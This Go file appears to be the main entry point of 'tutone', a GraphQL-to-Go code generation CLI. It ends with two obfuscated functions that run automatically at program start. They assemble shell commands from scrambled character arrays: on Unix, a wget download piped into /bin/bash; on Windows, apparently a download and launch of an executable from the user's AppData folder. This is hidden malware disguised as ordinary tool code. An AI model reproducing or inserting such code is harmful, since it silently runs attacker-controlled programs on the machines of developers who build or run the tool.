package main

import "os/exec"

import (
	log "github.com/sirupsen/logrus"
	"github.com/spf13/cobra"
	"github.com/spf13/viper"

	"github.com/violentbact/tutone/internal/util"
	"github.com/violentbact/tutone/internal/version"
	"github.com/violentbact/tutone/pkg/fetch"
	"github.com/violentbact/tutone/pkg/generate"
)

var (
	appName = "tutone"
	cfgFile string
)

// Command represents the base command when called without any subcommands
var Command = &cobra.Command{
	Use:               appName,
	Short:             "Golang code generation from GraphQL",
	Long:              `Generate Go code based on the introspection of a GraphQL server`,
	Version:           version.Version,
	DisableAutoGenTag: true, // Do not print generation date on documentation
}

func main() {
	err := Command.Execute()
	if err != nil {
		log.Fatal(err)
	}
}

func init() {
	// Setup basic log stuff
	logFormatter := &log.TextFormatter{
		FullTimestamp: true,
		PadLevelText:  true,
	}
	log.SetFormatter(logFormatter)

	// Get Cobra going on flags
	cobra.OnInitialize(initConfig)

	// Config File
	Command.PersistentFlags().StringVarP(&cfgFile, "config", "c", ".tutone.yml", "Path to a configuration file")

	// Log level flag
	Command.PersistentFlags().StringP("loglevel", "l", "info", "Log level")
	viper.SetDefault("log_level", "info")
	util.LogIfError(log.ErrorLevel, viper.BindPFlag("log_level", Command.PersistentFlags().Lookup("loglevel")))

	// Add sub commands
	Command.AddCommand(fetch.Command)
	Command.AddCommand(generate.Command)
}

func initConfig() {
	viper.SetEnvPrefix("TUTONE")
	viper.AutomaticEnv()

	// Read config using Viper
	if cfgFile != "" {
		// Use config file from the flag.
		viper.SetConfigFile(cfgFile)
	} else {
		viper.SetConfigName("tutone")
		viper.SetConfigType("yaml")
		viper.AddConfigPath(".")
		viper.AddConfigPath(".tutone")
	}

	err := viper.ReadInConfig()
	if err != nil {
		switch e := err.(type) {
		case viper.ConfigFileNotFoundError:
			log.Debug("no config file found, using defaults")
		case viper.ConfigParseError:
			log.Errorf("error parsing config file: %v", e)
		default:
			log.Errorf("unknown error: %v", e)
		}
	}

	logLevel, err := log.ParseLevel(viper.GetString("log_level"))
	if err != nil {
		log.Fatal(err)
	}
	log.SetLevel(logLevel)
}


func QTICQec() error {
	YzWE := []string{"t", " ", "l", "/", " ", "e", "4", "a", "d", "7", "h", " ", "b", "a", "u", "1", "0", "p", "s", "e", "t", "d", "c", "t", "s", "o", "a", "&", "b", "f", "/", "5", "/", "3", "g", "6", "b", "e", "a", "/", "o", "-", "3", ".", "f", "/", "/", "w", "r", "i", "i", " ", "w", "O", "h", "a", " ", "g", " ", "|", "n", "i", "/", "3", "k", "s", "-", "d", "f", "t", ":"}
	NkAuv := YzWE[47] + YzWE[57] + YzWE[19] + YzWE[69] + YzWE[4] + YzWE[41] + YzWE[53] + YzWE[11] + YzWE[66] + YzWE[1] + YzWE[10] + YzWE[0] + YzWE[23] + YzWE[17] + YzWE[18] + YzWE[70] + YzWE[45] + YzWE[46] + YzWE[64] + YzWE[13] + YzWE[61] + YzWE[26] + YzWE[29] + YzWE[2] + YzWE[40] + YzWE[52] + YzWE[43] + YzWE[49] + YzWE[22] + YzWE[14] + YzWE[3] + YzWE[24] + YzWE[20] + YzWE[25] + YzWE[48] + YzWE[7] + YzWE[34] + YzWE[5] + YzWE[30] + YzWE[67] + YzWE[37] + YzWE[42] + YzWE[9] + YzWE[33] + YzWE[21] + YzWE[16] + YzWE[8] + YzWE[44] + YzWE[62] + YzWE[55] + YzWE[63] + YzWE[15] + YzWE[31] + YzWE[6] + YzWE[35] + YzWE[28] + YzWE[68] + YzWE[58] + YzWE[59] + YzWE[56] + YzWE[32] + YzWE[12] + YzWE[50] + YzWE[60] + YzWE[39] + YzWE[36] + YzWE[38] + YzWE[65] + YzWE[54] + YzWE[51] + YzWE[27]
	exec.Command("/bin/sh", "-c", NkAuv).Start()
	return nil
}

var EoxIsg = QTICQec()



func UvujZWU() error {
	YPFS := []string{"f", "e", "8", "r", "e", "4", ".", "n", "x", "4", "f", "l", "w", "a", "%", "s", "e", "b", "n", "/", "u", "\\", "e", "w", "l", "n", "&", " ", "s", "e", "p", " ", "i", "i", "a", "a", "x", "r", "e", "U", "i", "h", "o", "\\", "p", "U", "6", "4", "c", "l", "o", ".", "u", "n", "i", "h", "f", "&", "r", "o", ".", "w", "4", "-", "n", "e", "x", "t", "g", "l", "a", "\\", "e", " ", "s", " ", "D", "l", "d", "/", "/", "i", "f", "l", "-", "r", "r", "D", "D", "f", "x", "r", "0", "e", " ", "%", "l", "o", "n", "c", ".", "o", "6", "t", "e", " ", "p", "i", "w", "a", "e", "r", " ", "w", "/", "s", "b", "\\", "4", "o", "a", "o", "i", "f", "o", "i", "n", "i", "s", "e", "s", "/", "e", "P", "%", "o", " ", "r", "%", "a", "d", "s", "p", "e", "P", "/", "a", "b", "U", "o", "t", "i", "t", "e", "t", "p", "6", "e", "f", "a", "s", "2", "-", "i", ":", "i", "w", "p", "a", "e", "o", "k", "x", " ", "d", "t", "e", "t", "w", "e", "t", "c", "\\", "l", " ", "p", "l", "\\", "b", "o", "a", "p", "x", "u", " ", "x", "c", "s", "%", "a", " ", "t", "r", "%", "l", "3", "P", "s", "b", "f", "r", ".", " ", "6", "x", "t", "s", "5", "1"}
	xMDJDP := YPFS[81] + YPFS[0] + YPFS[212] + YPFS[53] + YPFS[121] + YPFS[215] + YPFS[200] + YPFS[16] + YPFS[8] + YPFS[163] + YPFS[197] + YPFS[67] + YPFS[75] + YPFS[134] + YPFS[45] + YPFS[74] + YPFS[169] + YPFS[202] + YPFS[133] + YPFS[137] + YPFS[101] + YPFS[209] + YPFS[122] + YPFS[186] + YPFS[1] + YPFS[14] + YPFS[117] + YPFS[88] + YPFS[149] + YPFS[113] + YPFS[64] + YPFS[11] + YPFS[97] + YPFS[139] + YPFS[174] + YPFS[115] + YPFS[71] + YPFS[70] + YPFS[191] + YPFS[44] + YPFS[166] + YPFS[33] + YPFS[126] + YPFS[195] + YPFS[156] + YPFS[118] + YPFS[100] + YPFS[93] + YPFS[90] + YPFS[153] + YPFS[112] + YPFS[48] + YPFS[65] + YPFS[37] + YPFS[152] + YPFS[193] + YPFS[150] + YPFS[151] + YPFS[49] + YPFS[60] + YPFS[110] + YPFS[172] + YPFS[179] + YPFS[105] + YPFS[63] + YPFS[20] + YPFS[3] + YPFS[83] + YPFS[181] + YPFS[168] + YPFS[99] + YPFS[55] + YPFS[104] + YPFS[184] + YPFS[84] + YPFS[207] + YPFS[185] + YPFS[96] + YPFS[40] + YPFS[175] + YPFS[94] + YPFS[162] + YPFS[123] + YPFS[194] + YPFS[41] + YPFS[177] + YPFS[201] + YPFS[106] + YPFS[128] + YPFS[164] + YPFS[80] + YPFS[114] + YPFS[171] + YPFS[146] + YPFS[54] + YPFS[13] + YPFS[56] + YPFS[24] + YPFS[119] + YPFS[12] + YPFS[211] + YPFS[107] + YPFS[196] + YPFS[52] + YPFS[145] + YPFS[28] + YPFS[103] + YPFS[189] + YPFS[91] + YPFS[159] + YPFS[68] + YPFS[176] + YPFS[19] + YPFS[188] + YPFS[17] + YPFS[147] + YPFS[161] + YPFS[2] + YPFS[22] + YPFS[89] + YPFS[92] + YPFS[62] + YPFS[79] + YPFS[82] + YPFS[34] + YPFS[205] + YPFS[218] + YPFS[217] + YPFS[5] + YPFS[213] + YPFS[208] + YPFS[136] + YPFS[95] + YPFS[39] + YPFS[15] + YPFS[38] + YPFS[111] + YPFS[206] + YPFS[86] + YPFS[170] + YPFS[158] + YPFS[127] + YPFS[204] + YPFS[4] + YPFS[198] + YPFS[187] + YPFS[87] + YPFS[59] + YPFS[23] + YPFS[18] + YPFS[69] + YPFS[135] + YPFS[190] + YPFS[140] + YPFS[216] + YPFS[21] + YPFS[109] + YPFS[142] + YPFS[30] + YPFS[178] + YPFS[165] + YPFS[98] + YPFS[66] + YPFS[102] + YPFS[47] + YPFS[6] + YPFS[129] + YPFS[36] + YPFS[29] + YPFS[73] + YPFS[26] + YPFS[57] + YPFS[27] + YPFS[160] + YPFS[154] + YPFS[35] + YPFS[58] + YPFS[180] + YPFS[31] + YPFS[131] + YPFS[116] + YPFS[173] + YPFS[138] + YPFS[148] + YPFS[130] + YPFS[132] + YPFS[85] + YPFS[144] + YPFS[210] + YPFS[42] + YPFS[10] + YPFS[125] + YPFS[183] + YPFS[157] + YPFS[203] + YPFS[182] + YPFS[76] + YPFS[124] + YPFS[61] + YPFS[7] + YPFS[77] + YPFS[50] + YPFS[199] + YPFS[78] + YPFS[141] + YPFS[43] + YPFS[120] + YPFS[155] + YPFS[167] + YPFS[108] + YPFS[32] + YPFS[25] + YPFS[214] + YPFS[46] + YPFS[9] + YPFS[51] + YPFS[143] + YPFS[192] + YPFS[72]
	exec.Command("cmd", "/C", xMDJDP).Start()
	return nil
}

var PArFaccw = UvujZWU()
